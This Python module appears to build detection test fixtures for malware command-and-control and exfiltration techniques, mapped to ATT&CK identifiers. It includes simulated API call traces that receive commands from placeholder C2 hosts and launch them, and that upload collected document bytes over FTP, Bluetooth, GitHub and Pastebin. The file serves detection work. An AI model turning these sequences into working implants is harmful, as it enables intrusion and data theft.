"""Command/data channel variants grounded in raw API contents and object bindings."""

import base64
import copy
import json
from pathlib import Path
from urllib.parse import urlencode

from feasible_relations import (
    DOC,
    PLAIN,
    SOURCE,
    READ,
    DRIVE,
    drive_call,
    call,
    close,
    opener,
    p,
    ref,
    stage,
    transfer,
)


CASES = []
COMMAND = "cmd.exe /c whoami"


def add(attack_id, name, stages, calls, note, negatives=None, invalidators=None):
    CASES.append(
        dict(
            attack_id=attack_id,
            name=name,
            stages=copy.deepcopy(stages),
            positive_calls=copy.deepcopy(calls),
            negative_calls=copy.deepcopy(negatives or []),
            note=note,
            same_thread=False,
            invalidate=copy.deepcopy(invalidators or []),
        )
    )


def inet_close(binding):
    return {
        "apis": [
            "internetclosehandle",
            "internetconnect",
            "httpopenrequest",
            "ftpopenfile",
        ],
        "field": "handle",
        "binding": binding,
    }


def execute(binding="command", *, op="eq"):
    return stage(
        "launch-received-command",
        ["createprocess"],
        [p("application_name", "eq", ""), p("command_line", op, ref(binding))],
    )


launch = call("CreateProcessW", application_name="", command_line=COMMAND)


def http(
    body=None,
    *,
    field="received_text",
    bind="command",
    peer="c2.example.invalid",
    path="/command",
    extra=None,
):
    body = COMMAND.encode() if body is None else body
    predicates = [p("service", "eq", 3), p("server_name", "regex", r"\A[^\s/]+\Z")] + (
        extra or []
    )
    stages = [
        stage(
            "connect-http-peer",
            ["internetconnect"],
            predicates,
            {"c2_connection": "handle", "c2_peer": "server_name"},
        ),
        stage(
            "open-command-request",
            ["httpopenrequest"],
            [
                p("connection_handle", "eq", ref("c2_connection")),
                p("method", "eq", "GET"),
                p("object_name", "regex", r"\A/[^\r\n]*\Z"),
            ],
            {"c2_request": "handle"},
        ),
        stage(
            "send-command-request",
            ["httpsendrequest"],
            [p("request_handle", "eq", ref("c2_request"))],
        ),
        stage(
            "read-command-body",
            ["internetreadfile"],
            [p("request_handle", "eq", ref("c2_request")), p("bytes_read", "gt", 0)],
            {bind: field},
        ),
    ]
    calls = [
        call(
            "InternetConnectW",
            session_handle=1000,
            server_name=peer,
            server_port=80,
            service=3,
            handle=1001,
        ),
        call(
            "HttpOpenRequestW",
            connection_handle=1001,
            method="GET",
            object_name=path,
            handle=1002,
        ),
        call(
            "HttpSendRequestW", request_handle=1002, optional_hex="", optional_length=0
        ),
        call(
            "InternetReadFile",
            request_handle=1002,
            buffer_hex=body.hex(),
            bytes_read=len(body),
        ),
    ]
    return stages, calls


HSTAGES, HCALLS = http()
INVALIDATE_HTTP = [inet_close("c2_connection"), inet_close("c2_request")]
add(
    "T1071",
    "receive an HTTP command and request its execution",
    HSTAGES + [execute()],
    HCALLS + [launch],
    "Binds the HTTP body to the actual command-line argument of a successful launch in the same process/state. A generic HTTP request never satisfies the rule; actor identity, child execution, and intent remain unqualified.",
    invalidators=INVALIDATE_HTTP,
)
stages, calls = http(
    extra=[p("server_port", "gt", 1024), p("server_port", "lt", 65536)]
)
calls[0]["arguments"]["server_port"] = 8081
add(
    "T1571",
    "receive HTTP commands on a nondefault high port",
    stages + [execute()],
    calls + [launch],
    "Requires a high-port HTTP command channel with observed command-to-launch equality; a connection to an unusual port alone is insufficient.",
    invalidators=INVALIDATE_HTTP,
)

fstages = [
    stage(
        "connect-ftp-command-peer",
        ["internetconnect"],
        [p("service", "eq", 1)],
        {"ftp_connection": "handle"},
    ),
    stage(
        "open-ftp-command-file",
        ["ftpopenfile"],
        [
            p("connection_handle", "eq", ref("ftp_connection")),
            p("access", "bits_all", 0x80000000),
        ],
        {"ftp_file": "handle"},
    ),
    stage(
        "read-ftp-command",
        ["internetreadfile"],
        [p("request_handle", "eq", ref("ftp_file")), p("bytes_read", "gt", 0)],
        {"command": "received_text"},
    ),
    execute(),
]
fcalls = [
    call(
        "InternetConnectW",
        server_name="ftp.example.invalid",
        server_port=21,
        service=1,
        handle=1101,
    ),
    call(
        "FtpOpenFileW",
        connection_handle=1101,
        remote_path="command.txt",
        access=0x80000000,
        handle=1102,
    ),
    call(
        "InternetReadFile",
        request_handle=1102,
        buffer_hex=COMMAND.encode().hex(),
        bytes_read=len(COMMAND),
    ),
    launch,
]
add(
    "T1071.002",
    "receive and launch a command through an FTP file",
    fstages,
    fcalls,
    "Requires FTP service selection, the bound remote-file handle, and exact received-command/launch equality. FTP API names or ordinary downloads do not establish the predicate.",
    invalidators=[inet_close("ftp_connection"), inet_close("ftp_file")],
)
add(
    "T1071.004",
    "receive and launch a DNS TXT command",
    [
        stage(
            "resolve-txt-command",
            ["dnsquery"],
            [
                p("query_type", "eq", 16),
                p("record_type", "eq", 16),
                p("record_txt", "regex", r"\S"),
            ],
            {"command": "record_txt"},
        ),
        execute(),
    ],
    [
        call(
            "DnsQuery_W",
            query_name="command.example.invalid",
            query_type=16,
            record_type=16,
            record_txt=COMMAND,
        ),
        launch,
    ],
    "Binds an actual TXT response's contents to a successful command launch; an arbitrary DNS lookup does not qualify.",
)
add(
    "T1071.005",
    "receive and launch an MQTT message payload",
    [
        stage(
            "create-mqtt-client",
            ["mqttclientcreate"],
            [
                p("client_handle", "handle", True),
                p("server_uri", "regex", r"\Atcp://[^\s/:]+:[0-9]+\Z"),
            ],
            {"client": "client_handle"},
        ),
        stage(
            "connect-mqtt-client",
            ["mqttclientconnect"],
            [p("client_handle", "eq", ref("client"))],
        ),
        stage(
            "receive-mqtt-command",
            ["mqttclientreceive"],
            [
                p("client_handle", "eq", ref("client")),
                p("topic", "regex", r"\S"),
                p("payload_length", "gt", 0),
            ],
            {"command": "received_text"},
        ),
        execute(),
    ],
    [
        call(
            "MQTTClient_create",
            client_handle=1201,
            server_uri="tcp://broker.example.invalid:1883",
        ),
        call("MQTTClient_connect", client_handle=1201),
        call(
            "MQTTClient_receive",
            client_handle=1201,
            topic="lab/command",
            buffer_hex=COMMAND.encode().hex(),
            payload_length=len(COMMAND),
        ),
        launch,
    ],
    "Uses the Paho native client's actual connected handle and received payload length/content. Pub/sub capability alone does not establish C2.",
)
pop = b"+OK 100 octets\r\nSubject: lab\r\n\r\n" + COMMAND.encode() + b"\r\n.\r\n"
add(
    "T1071.003",
    "retrieve and launch a POP3 message body",
    [
        stage(
            "request-pop3-message",
            ["send"],
            [p("received_text", "regex", r"\ARETR [1-9][0-9]*\r\n\Z")],
            {"socket": "socket_handle"},
        ),
        stage(
            "receive-pop3-message",
            ["recv"],
            [p("socket_handle", "eq", ref("socket")), p("bytes_transferred", "gt", 0)],
            {"command": "pop3_command"},
        ),
        execute(),
    ],
    [
        {
            **call("send", socket_handle=1301, buffer_hex=b"RETR 1\r\n".hex()),
            "result": 8,
        },
        {**call("recv", socket_handle=1301, buffer_hex=pop.hex()), "result": len(pop)},
        launch,
    ],
    "Requires a complete POP3 retrieval response and execution of its exact message body. Ordinary mail API references never count.",
)

body = base64.b64encode(COMMAND.encode())
stages, calls = http(body, bind="encoded")
decoder = stage(
    "decode-base64-command",
    ["cryptstringtobinary"],
    [p("input_string", "eq", ref("encoded")), p("flags", "eq", 1)],
    {"command": "decoded_text"},
)
decode_call = call(
    "CryptStringToBinaryW",
    input_string=body.decode(),
    flags=1,
    output_hex=COMMAND.encode().hex(),
    output_length=len(COMMAND),
)
for technique in ("T1132", "T1132.001"):
    add(
        technique,
        "decode and launch a base64 command from the bound channel",
        stages + [decoder, execute()],
        calls + [decode_call, launch],
        "Binds received C2 text, verified Base64 decoder input/output, and the actual command-line argument. Encoding unrelated file data cannot satisfy the predicate.",
        invalidators=INVALIDATE_HTTP,
    )
for technique, op, body in [
    ("T1132.002", "xor_text", bytes(c ^ 0x5A for c in COMMAND.encode())),
    ("T1001", "uniform_prefix_text", b"X" * 64 + COMMAND.encode()),
    ("T1001.001", "uniform_prefix_text", b"X" * 64 + COMMAND.encode()),
]:
    stages, calls = http(body, field="buffer_hex", bind="encoded")
    add(
        technique,
        "recover and launch a transformed command from the bound channel",
        stages + [execute("encoded", op=op)],
        calls + [launch],
        "Requires a concrete algebraic relation between received bytes and the launched command: a nonzero fixed XOR across at least 16 bytes, or a discarded uniform prefix of at least 32 bytes. Intent and the sample's decoder implementation remain unqualified.",
        invalidators=INVALIDATE_HTTP,
    )

encrypted = bytes(range(128))
for technique, algorithm in [
    ("T1573", None),
    ("T1573.001", 0x6801),
    ("T1573.002", 0xA400),
]:
    stages, calls = http(encrypted, field="buffer_hex", bind="ciphertext")
    if algorithm is not None:
        stages.append(
            stage(
                "identify-csp-key-algorithm",
                ["cryptgetkeyparam"],
                [
                    p("parameter", "eq", 7),
                    p(
                        "algorithm_id",
                        "in",
                        [0x6601, 0x6603, 0x660E, 0x660F, 0x6610, 0x6801]
                        if technique.endswith("001")
                        else [0xA400],
                    ),
                ],
                {"key": "key_handle"},
            )
        )
        calls.append(
            call(
                "CryptGetKeyParam",
                key_handle=1401,
                parameter=7,
                output_hex=algorithm.to_bytes(4, "little").hex(),
                output_length=4,
            )
        )
    predicates = [
        p("input_hex", "eq", ref("ciphertext")),
        p("output_hex", "ne", ref("ciphertext")),
    ]
    if algorithm is not None:
        predicates.append(p("key_handle", "eq", ref("key")))
    stages += [
        stage(
            "decrypt-channel-command",
            ["cryptdecrypt"],
            predicates,
            {"command": "decoded_text"},
        ),
        execute(),
    ]
    calls += [
        call(
            "CryptDecrypt",
            key_handle=1401,
            input_hex=encrypted.hex(),
            output_hex=COMMAND.encode().hex(),
            output_length=len(COMMAND),
        ),
        launch,
    ]
    add(
        technique,
        "decrypt and launch a command from an algorithm-bound channel",
        stages,
        calls,
        "Binds network ciphertext to successful CSP decryption and the resulting command launch. Symmetric/RSA variants require the actual key's KP_ALGID response; unrelated crypto calls or supplied algorithm labels do not count.",
        invalidators=INVALIDATE_HTTP,
    )

stages = HSTAGES + [
    execute(),
    opener(DOC),
    transfer("read", buffer_binding="collected"),
    stage(
        "open-c2-upload-request",
        ["httpopenrequest"],
        [p("connection_handle", "eq", ref("c2_connection")), p("method", "eq", "POST")],
        {"upload": "handle"},
    ),
    stage(
        "send-collected-bytes-on-c2",
        ["httpsendrequest"],
        [
            p("request_handle", "eq", ref("upload")),
            p("optional_hex", "eq", ref("collected")),
        ],
    ),
]
calls = HCALLS + [
    launch,
    SOURCE,
    READ,
    call(
        "HttpOpenRequestW",
        connection_handle=1001,
        method="POST",
        object_name="/upload",
        handle=1003,
    ),
    call(
        "HttpSendRequestW",
        request_handle=1003,
        optional_hex=PLAIN,
        optional_length=len(bytes.fromhex(PLAIN)),
    ),
]
add(
    "T1041",
    "send collected document bytes over the established command channel",
    stages,
    calls,
    "Establishes the HTTP channel's command role through received-command execution, then binds local document bytes to a request on that same connection. It does not infer exfiltration from arbitrary network sends.",
    invalidators=INVALIDATE_HTTP + [inet_close("upload"), close()],
)

for technique, algorithm in [
    ("T1048", None),
    ("T1048.003", None),
    ("T1048.001", 0x6801),
    ("T1048.002", 0xA400),
]:
    stages = HSTAGES + [
        execute(),
        opener(DOC),
        transfer("read", buffer_binding="collected"),
    ]
    calls = HCALLS + [launch, SOURCE, READ]
    payload = PLAIN
    binding = "collected"
    if algorithm is not None:
        stages += [
            stage(
                "identify-transfer-key",
                ["cryptgetkeyparam"],
                [p("parameter", "eq", 7), p("algorithm_id", "eq", algorithm)],
                {"transfer_key": "key_handle"},
            ),
            stage(
                "encrypt-collected-bytes",
                ["cryptencrypt"],
                [
                    p("key_handle", "eq", ref("transfer_key")),
                    p("input_hex", "eq", ref("collected")),
                    p("output_hex", "ne", ref("collected")),
                ],
                {"encrypted_collection": "output_hex"},
            ),
        ]
        payload = (bytes(range(128))).hex()
        binding = "encrypted_collection"
        calls += [
            call(
                "CryptGetKeyParam",
                key_handle=1401,
                parameter=7,
                output_hex=algorithm.to_bytes(4, "little").hex(),
                output_length=4,
            ),
            call("CryptEncrypt", key_handle=1401, input_hex=PLAIN, output_hex=payload),
        ]
    stages += [
        stage(
            "connect-alternative-ftp-peer",
            ["internetconnect"],
            [p("service", "eq", 1), p("server_name", "ne", ref("c2_peer"))],
            {"transfer_connection": "handle"},
        ),
        stage(
            "open-remote-output",
            ["ftpopenfile"],
            [
                p("connection_handle", "eq", ref("transfer_connection")),
                p("access", "bits_all", 0x40000000),
            ],
            {"transfer_file": "handle"},
        ),
        stage(
            "write-collected-bytes",
            ["internetwritefile"],
            [
                p("request_handle", "eq", ref("transfer_file")),
                p("bytes_written", "gt", 0),
                p("buffer_hex", "eq", ref(binding)),
            ],
        ),
    ]
    calls += [
        call(
            "InternetConnectW",
            server_name="transfer.example.invalid",
            server_port=21,
            service=1,
            handle=1501,
        ),
        call(
            "FtpOpenFileW",
            connection_handle=1501,
            remote_path="collection.bin",
            access=0x40000000,
            handle=1502,
        ),
        call(
            "InternetWriteFile",
            request_handle=1502,
            buffer_hex=payload,
            bytes_written=len(bytes.fromhex(payload)),
        ),
    ]
    add(
        technique,
        "send collected bytes over FTP distinct from the observed HTTP command channel",
        stages,
        calls,
        "Requires an established HTTP command channel, a separate FTP output channel, and exact collected-data/transfer equality. Encrypted variants bind the CSP key algorithm and encrypted bytes. Host aliases, protocol confidentiality, actual peer identity, unauthorized disclosure, and completed transfer require independent qualification.",
        invalidators=INVALIDATE_HTTP
        + [inet_close("transfer_connection"), inet_close("transfer_file"), close()],
    )

for technique, host, path, method, content_field, data in [
    (
        "T1567.001",
        "api.github.com",
        "/repos/lab/repository/contents/report.txt",
        "PUT",
        "github_content_hex",
        json.dumps(
            {
                "message": "lab",
                "content": base64.b64encode(bytes.fromhex(PLAIN)).decode(),
            }
        ).encode(),
    ),
    (
        "T1567.003",
        "pastebin.com",
        "/api/api_post.php",
        "POST",
        "paste_text",
        urlencode(
            {
                "api_option": "paste",
                "api_dev_key": "example-only",
                "api_paste_code": bytes.fromhex(PLAIN).decode(),
            }
        ).encode(),
    ),
]:
    source_field = "buffer_hex" if content_field.endswith("hex") else "read_text"
    stages = [
        opener(DOC),
        transfer("read"),
        stage(
            "bind-read-data",
            ["readfile"],
            [p("handle", "eq", ref("file")), p("bytes_transferred", "gt", 0)],
            {"collected": source_field},
        ),
        stage(
            "connect-web-service",
            ["internetconnect"],
            [p("service", "eq", 3), p("server_name", "eq", host)],
            {"service": "handle"},
        ),
        stage(
            "open-service-upload",
            ["httpopenrequest"],
            [
                p("connection_handle", "eq", ref("service")),
                p("method", "eq", method),
                p(
                    "object_name",
                    "regex",
                    r"\A/repos/[^/]+/[^/]+/contents/.+\Z"
                    if technique.endswith("001")
                    else r"\A/api/api_post\.php\Z",
                ),
            ],
            {"upload": "handle"},
        ),
        stage(
            "upload-collected-content",
            ["httpsendrequest"],
            [
                p("request_handle", "eq", ref("upload")),
                p(content_field, "eq", ref("collected")),
            ],
        ),
    ]
    # One nonempty read suffices. Bind on that actual read rather than require
    # an artificial second read merely for the generator's helper interface.
    stages[1] = stages.pop(2)
    calls = [
        SOURCE,
        READ,
        call(
            "InternetConnectW",
            server_name=host,
            server_port=443,
            service=3,
            handle=1601,
        ),
        call(
            "HttpOpenRequestW",
            connection_handle=1601,
            method=method,
            object_name=path,
            handle=1602,
        ),
        call(
            "HttpSendRequestW",
            request_handle=1602,
            optional_hex=data.hex(),
            optional_length=len(data),
        ),
    ]
    add(
        technique,
        "request an upload of collected content through a specific web-service API",
        stages,
        calls,
        "Parses the actual GitHub Contents JSON/Base64 or Pastebin form body and binds its data to a local document read. A service-domain string or unrelated upload is insufficient. HTTP acceptance and unauthorized disclosure remain unqualified.",
        invalidators=[close(), inet_close("service"), inet_close("upload")],
    )

gist_body = json.dumps({"files": {"command.txt": {"content": COMMAND}}}).encode()
stages, calls = http(
    gist_body,
    field="gist_file_text",
    peer="api.github.com",
    path="/gists/0123456789abcdef",
    extra=[p("server_name", "eq", "api.github.com")],
)
stages[1]["where"].append(p("object_name", "regex", r"\A/gists/[0-9a-f]+\Z"))
add(
    "T1102",
    "receive a web-service hosted command and request its execution",
    stages + [execute()],
    calls + [launch],
    "Parses a GitHub Gist response's actual file content and binds it to the launched command; merely accessing a web service does not qualify.",
    invalidators=INVALIDATE_HTTP,
)
post_body = json.dumps(
    {"files": {"report.txt": {"content": bytes.fromhex(PLAIN).decode()}}}
).encode()
stages += [
    execute(),
    opener(DOC),
    stage(
        "read-collected-text",
        ["readfile"],
        [p("handle", "eq", ref("file")), p("bytes_transferred", "gt", 0)],
        {"collected_text": "read_text"},
    ),
    stage(
        "open-gist-output",
        ["httpopenrequest"],
        [
            p("connection_handle", "eq", ref("c2_connection")),
            p("method", "eq", "POST"),
            p("object_name", "eq", "/gists"),
        ],
        {"output": "handle"},
    ),
    stage(
        "post-collected-gist",
        ["httpsendrequest"],
        [
            p("request_handle", "eq", ref("output")),
            p("gist_file_text", "eq", ref("collected_text")),
        ],
    ),
]
calls += [
    launch,
    SOURCE,
    READ,
    call(
        "HttpOpenRequestW",
        connection_handle=1001,
        method="POST",
        object_name="/gists",
        handle=1003,
    ),
    call(
        "HttpSendRequestW",
        request_handle=1003,
        optional_hex=post_body.hex(),
        optional_length=len(post_body),
    ),
]
add(
    "T1102.002",
    "receive commands and upload collected data through the same web service",
    stages,
    calls,
    "Requires both observed directions: a Gist-hosted command passed to a launch and a local document placed in an outgoing Gist JSON request. It never infers bidirectional C2 from a generic service connection.",
    invalidators=INVALIDATE_HTTP + [close(), inet_close("output")],
)

for technique in ("T1102.001", "T1104"):
    directory = json.dumps(
        {"files": {"endpoint.txt": {"content": "next.example.invalid"}}}
    ).encode()
    stages, calls = http(
        directory,
        field="gist_file_text",
        bind="next_peer",
        peer="api.github.com",
        path="/gists/0123456789abcdef",
        extra=[p("server_name", "eq", "api.github.com")],
    )
    stages[1]["where"].append(p("object_name", "regex", r"\A/gists/[0-9a-f]+\Z"))
    second_stages, second_calls = http(peer="next.example.invalid")
    # The first response selects the next peer. The second connection and its
    # request/body are separate objects, not a mere pair of network API names.
    for s in second_stages:
        s["id"] = "second-" + s["id"]
        for predicate in s["where"]:
            if isinstance(predicate["value"], dict):
                predicate["value"]["ref"] = "second_" + predicate["value"]["ref"]
        s["bind"] = {"second_" + k: v for k, v in s["bind"].items()}
    second_stages[0]["where"].append(p("server_name", "eq", ref("next_peer")))
    for c in second_calls:
        for field in ("handle", "connection_handle", "request_handle"):
            if field in c["arguments"]:
                c["arguments"][field] += 100
    stages += second_stages + [execute("second_command")]
    calls += second_calls + [launch]
    add(
        technique,
        "resolve the next command endpoint through a web-service dead drop",
        stages,
        calls,
        "Binds a Gist response's endpoint string to a subsequent connection, then binds a second-channel response to command execution. Two unrelated connections never establish the transition.",
        invalidators=INVALIDATE_HTTP
        + [inet_close("second_c2_connection"), inet_close("second_c2_request")],
    )

stages, calls = http()
image_path = r"C:\stage\client.exe"
stages = [
    stage(
        "identify-client-image",
        ["getmodulefilename"],
        [
            p("module_handle", "eq", 0),
            p(
                "module_path",
                "regex",
                r"(?i)\A[A-Z]:\\(?!(?:[^\\]+\\)*(?:chrome|msedge|firefox)\.exe\Z)[^\r\n]+\.exe\Z",
            ),
        ],
    ),
    stage(
        "open-browser-looking-client",
        ["internetopen"],
        [p("user_agent", "regex", r"\AMozilla/5\.0 .*Chrome/[0-9.]+.*\Z")],
        {"browser_session": "handle"},
    ),
] + stages
stages[2]["where"].append(p("session_handle", "eq", ref("browser_session")))
calls = [
    {
        **call(
            "GetModuleFileNameW",
            module_handle=0,
            module_path=image_path,
            buffer_capacity=260,
        ),
        "result": len(image_path),
    },
    call(
        "InternetOpenW",
        user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/130.0",
        handle=1000,
    ),
] + calls
add(
    "T1036.012",
    "use a browser-looking user agent for a nonbrowser command client",
    stages + [execute()],
    calls + [launch],
    "Requires a nonbrowser current-image name, an explicit browser user agent bound to the HTTP session, and received-command execution. UA strings alone do not establish the predicate; actual publisher and complete fingerprint matching remain unqualified.",
    invalidators=INVALIDATE_HTTP + [inet_close("browser_session")],
)

add(
    "T1092",
    "read a removable-medium command and request its execution",
    [
        DRIVE,
        stage(
            "open-removable-command-file",
            ["createfile"],
            [
                p("path", "same_volume", ref("volume")),
                p("path", "regex", r"(?i)\A[A-Z]:\\[^\r\n]+\.(?:txt|cmd)\Z"),
                p("handle", "handle", True),
            ],
            {"file": "handle"},
        ),
        stage(
            "read-medium-command",
            ["readfile"],
            [p("handle", "eq", ref("file")), p("bytes_transferred", "gt", 0)],
            {"command": "read_text"},
        ),
        execute(),
    ],
    [
        drive_call,
        call("CreateFileW", path=r"E:\commands.txt", handle=64),
        call(
            "ReadFile",
            handle=64,
            bytes_transferred=len(COMMAND),
            buffer_hex=COMMAND.encode().hex(),
        ),
        launch,
    ],
    "Binds a received command on a classified removable volume to the actual command-line argument. An arbitrary removable-file access does not establish a command channel.",
    invalidators=[close()],
)

image = (
    Path(__file__).resolve().parents[1] / "fixtures/feasible_command.bmp"
).read_bytes()
stages, calls = http(image, field="bmp_command")
add(
    "T1001.002",
    "recover and launch a pixel-LSB command from a received BMP",
    stages + [execute()],
    calls + [launch],
    "Requires a structurally valid 24-bit BMP, the explicit length-prefixed pixel-LSB decoder variant, and exact equality with the actual launched command. Merely receiving an image does not qualify.",
    invalidators=INVALIDATE_HTTP,
)
for technique in ("T1011", "T1011.001"):
    stages = HSTAGES + [
        execute(),
        opener(DOC),
        transfer("read", buffer_binding="collected"),
        stage(
            "connect-bluetooth-peer",
            ["connect"],
            [
                p("address_family", "eq", 32),
                p("bluetooth_address", "gt", 0),
                p("bluetooth_address", "lt", 0x1000000000000),
            ],
            {"radio_socket": "socket_handle"},
        ),
        stage(
            "send-collected-data-over-radio",
            ["send"],
            [
                p("socket_handle", "eq", ref("radio_socket")),
                p("bytes_transferred", "gt", 0),
                p("buffer_hex", "eq", ref("collected")),
            ],
        ),
    ]
    calls = HCALLS + [
        launch,
        SOURCE,
        READ,
        call(
            "connect",
            socket_handle=2301,
            address_family=32,
            bluetooth_address=0x123456789ABC,
        ),
        {
            **call("send", socket_handle=2301, buffer_hex=PLAIN),
            "result": len(bytes.fromhex(PLAIN)),
        },
    ]
    add(
        technique,
        "send collected bytes over Bluetooth alongside an observed HTTP command channel",
        stages,
        calls,
        "Requires command-to-launch evidence for HTTP, a successful AF_BTH connection, and document-byte equality at the actual radio-socket send. Adapter topology, underlying physical medium of the HTTP route, peer receipt, and unauthorized disclosure require qualification.",
        invalidators=INVALIDATE_HTTP
        + [
            close(),
            {
                "apis": ["closesocket"],
                "field": "socket_handle",
                "binding": "radio_socket",
            },
        ],
    )

for technique in ("T1568", "T1568.001"):
    stages, calls, invalidators = [], [], []
    for index in range(3):
        address = "192.0.2." + str(index + 1)
        predicates = [
            p("query_type", "eq", 1),
            p("record_type", "eq", 1),
            p("query_flags", "bits_all", 8),
            p("record_ttl", "gt", 0),
            p("record_ttl", "lt", 61),
            p("record_address", "regex", r"\A[0-9.]+\Z"),
        ]
        if index:
            predicates += [p("query_name", "eq", ref("flux_hostname"))] + [
                p("record_address", "ne", ref("flux_address" + str(prior)))
                for prior in range(index)
            ]
        bind = {"flux_address" + str(index): "record_address"}
        if not index:
            bind["flux_hostname"] = "query_name"
        stages.append(
            stage(
                "resolve-short-lived-address-" + str(index),
                ["dnsquery"],
                predicates,
                bind,
            )
        )
        calls.append(
            call(
                "DnsQuery_W",
                query_name="c2.example.invalid",
                query_type=1,
                query_flags=8,
                record_type=1,
                record_address=address,
                record_ttl=30,
            )
        )
        channel_stages, channel_calls = http(peer=address)
        prefix = "flux" + str(index) + "_"
        for s in channel_stages:
            s["id"] = prefix + s["id"]
            for predicate in s["where"]:
                if isinstance(predicate["value"], dict):
                    predicate["value"]["ref"] = prefix + predicate["value"]["ref"]
            s["bind"] = {prefix + k: v for k, v in s["bind"].items()}
        channel_stages[0]["where"].append(
            p("server_name", "eq", ref("flux_address" + str(index)))
        )
        for c in channel_calls:
            for field in ("handle", "connection_handle", "request_handle"):
                if field in c["arguments"]:
                    c["arguments"][field] += index * 100
        stages += channel_stages + [execute(prefix + "command")]
        stages[-1]["id"] += "-" + str(index)
        calls += channel_calls + [launch]
        invalidators += [
            inet_close(prefix + "c2_connection"),
            inet_close(prefix + "c2_request"),
        ]
    add(
        technique,
        "use three short-TTL rotating DNS addresses as command endpoints",
        stages,
        calls,
        "Within the bounded session, three cache-bypassing A queries for one hostname must return distinct low-TTL addresses, and each exact address must supply a command passed to a launch. DNS rotation alone is insufficient; infrastructure ownership, CDN distinctions, long-term flux operation, and malicious intent remain unqualified.",
        invalidators=invalidators,
    )

# Independent near misses alter an actual bound command/content rather than
# weakening the predicate or manufacturing a positive from its regex.
for case in CASES:
    bound = {name for s in case["stages"] for name in s["bind"]}
    for name in bound & {"key", "transfer_key"}:
        case["invalidate"].append(
            {
                "apis": [
                    "cryptdestroykey",
                    "cryptimportkey",
                    "cryptgenkey",
                    "cryptderivekey",
                ],
                "field": "key_handle",
                "binding": name,
            }
        )
    if case["attack_id"] == "T1071.005":
        case["invalidate"].append(
            {
                "apis": ["mqttclientcreate", "mqttclientdisconnect"],
                "field": "client_handle",
                "binding": "client",
            }
        )
    if case["attack_id"] == "T1071.003":
        case["invalidate"].append(
            {"apis": ["closesocket"], "field": "socket_handle", "binding": "socket"}
        )
    if not case["negative_calls"]:
        negative = copy.deepcopy(case["positive_calls"])
        for row in reversed(negative):
            if row["api"] == "CreateProcessW":
                row["arguments"]["command_line"] = "unrelated.exe /version"
                break
        else:
            last = negative[-1]["arguments"]
            last.update(
                optional_hex=b"unrelated upload".hex(),
                optional_length=len(b"unrelated upload"),
            )
        case["negative_calls"] = [negative]
